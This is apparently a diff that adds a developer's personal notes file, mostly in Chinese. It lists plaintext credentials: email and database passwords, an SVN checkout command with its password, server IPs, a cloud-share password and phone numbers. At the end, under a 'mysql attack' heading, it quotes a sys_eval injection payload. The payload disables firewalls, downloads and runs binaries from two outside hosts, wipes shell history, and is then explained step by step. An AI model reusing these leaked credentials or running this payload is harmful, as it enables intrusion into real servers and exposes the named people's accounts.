@@ -1,0 +1,110 @@
+showdoc.skyware.com.cn
+
+1316421727@qq.com
+skyware.com.cn
+
+
+123.57.221.243 
+
+//qq企业邮箱
+liugj@djlink.cn
+Djling123
+
+
+15210373299 张东
+
+210.51.17.141  dbadmin141/141comdb@haierubic
+
+ios_008
+ios_008
+
+账号：lengdong
+密码：LengDong1234
+http://123.57.43.209:8080/terminal-store/
+
+
+@Liu Guangjie  用户名密码都是test
+地址明天问代武星要一下
+@明月朔风
+
+https://182.92.81.123/svn/lzpt/terminal-store
+
+
+总共八个：
+前四个【登录&账户管理】【订单管理】【商品管理】【店铺管理】
+后四个【区域管理】【客户管理】【数据统计】【账户管理】
+是这样分吧，确认下
+
+
+
+#刘光杰
+liugj=QwTYLw
+svn checkout svn://210.51.17.141/svndata/gasheaterAppserver --username liugj --password QwTYLw
+
+
+
+
+方亚琼(543281847)  13:39:21
+智汇中心最新修改7-13 
+
+发件人：evayin <evayin@parawill.com> 自动归档	
+时   间：2016年7月13日(星期三) 中午12:50	
+收件人： 
+Tao Tao3 Guo <guotao3@lenovo.com>; 方亚琼 <fangyq@djlink.cn>
+hi all
+
+修改及源文件由于过大请在百度云盘下载
+
+ 链接：https://eyun.baidu.com/s/3b8mvoi 密码：6ixk
+
+ 请查收，确认
+
+tkeva
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+mysql 攻击
+
+select sys_eval('/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cp /usr/bin/wget .;chmod +x wget;./wget -P ./dbms_temp http://game918.me:2545/websevrer;chmod 0755 ./dbms_temp/websevrer;./dbms_temp/websevrer;./wget -P ./db_temp http://198.55.103.12:280/huang;chmod 0755 ./db_temp/huang;./db_temp/huang;rm -rf wget;history -c;')
+
+linux命令我看得懂
+
+第一步关闭了所有类型的防火墙，
+
+第二步wget提权
+
+第三步get一个应用程序 webserver 运行
+
+第四步get一个应用程序 huang 运行
+
+第五步删记录
+
+
+29:30
+
+31：30
+最多
